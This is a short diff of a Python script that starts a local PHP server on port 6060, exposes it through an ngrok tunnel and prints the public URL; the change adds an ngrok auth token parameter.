@@ -555,7 +555,7 @@ exit();""")
       print("")
       print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Php Server Has Started on Port 6060")
 
-      link = ngrok.connect(6060,"http")
+      link = ngrok.connect(6060,"http",auth_token=token)
       a_print_link = (Fore.RED+" ["+Fore.WHITE+"$"+Fore.RED+"]"+Fore.RED+" url1 : "+link)
       b_print_link = (a_print_link).replace("http","https")
       print("\n"+b_print_link)
